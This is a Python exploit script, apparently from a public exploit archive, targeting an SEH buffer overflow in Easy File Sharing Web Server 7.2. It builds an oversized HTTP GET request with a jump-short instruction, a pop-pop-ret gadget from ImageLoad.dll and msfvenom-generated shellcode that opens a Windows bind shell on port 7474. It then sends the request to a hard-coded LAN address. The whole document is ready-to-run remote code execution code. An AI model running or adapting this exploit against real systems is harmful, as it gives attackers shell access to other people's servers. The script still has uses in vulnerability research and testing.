# Easy File Sharing Web Server 7.2 SEH Overflow
# Credits to sensei: ch3rn0byl
# Developed by fuzzlove (2019)
# Tested on Windows 7 Home Basic SP1
# To do: egghunter

import socket
import struct

# msfvenom -p windows/shell_bind_tcp LPORT=7474 -f python -a x86 --platform windows -b "\x00\x20\x25\x2b\x2f\x5c" -v sh3ll EXITFUNC=thread

sh3ll =  ""
sh3ll += "\xbd\x61\x10\x92\x5d\xda\xc5\xd9\x74\x24\xf4\x5b\x31"
sh3ll += "\xc9\xb1\x53\x31\x6b\x12\x83\xeb\xfc\x03\x0a\x1e\x70"
sh3ll += "\xa8\x30\xf6\xf6\x53\xc8\x07\x97\xda\x2d\x36\x97\xb9"
sh3ll += "\x26\x69\x27\xc9\x6a\x86\xcc\x9f\x9e\x1d\xa0\x37\x91"
sh3ll += "\x96\x0f\x6e\x9c\x27\x23\x52\xbf\xab\x3e\x87\x1f\x95"
sh3ll += "\xf0\xda\x5e\xd2\xed\x17\x32\x8b\x7a\x85\xa2\xb8\x37"
sh3ll += "\x16\x49\xf2\xd6\x1e\xae\x43\xd8\x0f\x61\xdf\x83\x8f"
sh3ll += "\x80\x0c\xb8\x99\x9a\x51\x85\x50\x11\xa1\x71\x63\xf3"
sh3ll += "\xfb\x7a\xc8\x3a\x34\x89\x10\x7b\xf3\x72\x67\x75\x07"
sh3ll += "\x0e\x70\x42\x75\xd4\xf5\x50\xdd\x9f\xae\xbc\xdf\x4c"
sh3ll += "\x28\x37\xd3\x39\x3e\x1f\xf0\xbc\x93\x14\x0c\x34\x12"
sh3ll += "\xfa\x84\x0e\x31\xde\xcd\xd5\x58\x47\xa8\xb8\x65\x97"
sh3ll += "\x13\x64\xc0\xdc\xbe\x71\x79\xbf\xd6\xb6\xb0\x3f\x27"
sh3ll += "\xd1\xc3\x4c\x15\x7e\x78\xda\x15\xf7\xa6\x1d\x59\x22"
sh3ll += "\x1e\xb1\xa4\xcd\x5f\x98\x62\x99\x0f\xb2\x43\xa2\xdb"
sh3ll += "\x42\x6b\x77\x71\x4a\xca\x28\x64\xb7\xac\x98\x28\x17"
sh3ll += "\x45\xf3\xa6\x48\x75\xfc\x6c\xe1\x1e\x01\x8f\x10\xed"
sh3ll += "\x8c\x69\x40\x01\xd9\x22\xfc\xe3\x3e\xfb\x9b\x1c\x15"
sh3ll += "\x53\x0b\x54\x7f\x64\x34\x65\x55\xc2\xa2\xee\xba\xd6"
sh3ll += "\xd3\xf0\x96\x7e\x84\x67\x6c\xef\xe7\x16\x71\x3a\x9f"
sh3ll += "\xbb\xe0\xa1\x5f\xb5\x18\x7e\x08\x92\xef\x77\xdc\x0e"
sh3ll += "\x49\x2e\xc2\xd2\x0f\x09\x46\x09\xec\x94\x47\xdc\x48"
sh3ll += "\xb3\x57\x18\x50\xff\x03\xf4\x07\xa9\xfd\xb2\xf1\x1b"
sh3ll += "\x57\x6d\xad\xf5\x3f\xe8\x9d\xc5\x39\xf5\xcb\xb3\xa5"
sh3ll += "\x44\xa2\x85\xda\x69\x22\x02\xa3\x97\xd2\xed\x7e\x1c"
sh3ll += "\xf2\x0f\xaa\x69\x9b\x89\x3f\xd0\xc6\x29\xea\x17\xff"
sh3ll += "\xa9\x1e\xe8\x04\xb1\x6b\xed\x41\x75\x80\x9f\xda\x10"
sh3ll += "\xa6\x0c\xda\x30"
 
seh = struct.pack('<L', 0x100228f2) #pop esi # pop edi # ret  | [ImageLoad.dll]

crash = "A" * 4061
crash += "\xeb\x06\x90\x90" # JMP SHORT 6, NOP Padding
crash += seh
crash += "D" * (5500 - 4061 - 4 - 4 - len(sh3ll))
crash += sh3ll
 
payload = 'GET {} HTTP/1.0\r\n\r\n'.format(crash)
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.32.160', 80))
s.send(payload)
s.close()
